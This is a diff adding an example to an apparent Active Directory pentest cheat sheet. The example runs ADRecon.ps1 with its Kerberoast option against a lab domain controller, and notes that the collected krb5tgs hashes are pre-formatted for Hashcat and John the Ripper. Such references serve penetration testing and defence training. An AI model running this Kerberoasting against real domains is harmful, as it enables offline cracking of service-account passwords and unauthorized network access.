@@ -103,6 +103,28 @@ C:\AD\jfc-tools>Rubeus.exe kerberoast /nowrap
 <SNIP>
 
 
+Example 3 - Use the PowerShell script ADrecon.ps1 with the option 'Kerberoast'
+========================================================================================
+
+PS C:\AD\jfc-tools> .\ADRecon.ps1 -Method ADWS -DomainController 192.168.1.50 -Credential security-Lab/user -Collect default,ACLs,Kerberoast
+
+[*] ADRecon v1.24 by Prashant Mahajan (@prashant3535)
+WARNING: [Invoke-ADRecon] ActiveDirectory Module from RSAT (Remote Server Administration Tools) is not installed ... Continuing with LDAP
+[*] Running on security-test-lab.local\laptop1 - Member Server
+[*] LDAP bind Successful
+[*] Commencing - 08/12/2020 10:29:13
+[-] Domain
+<SNIP>
+[-] Kerberoast
+
+[*] Total Execution Time (mins): 0.18
+[*] Output Directory: C:\AD\jfc-tools\ADRecon-Report-20200812102913
+ADRecon-Report.xslx on a host with Microsoft Excel installed.
+
+=> The results with the krb5tgs hashes are stored in the file 'kerberoast.csv' located in the output directory 'C:\AD\jfc-tools\ADRecon-Report-20200812102913'.
+   The krb5tgs hashes are pre-formated for the password cracking tools 'Hashcat' and 'JTR'.
+
+
 Other methods / Tools
 ========================================================================================
 => Invoke-Kerberoast.ps1
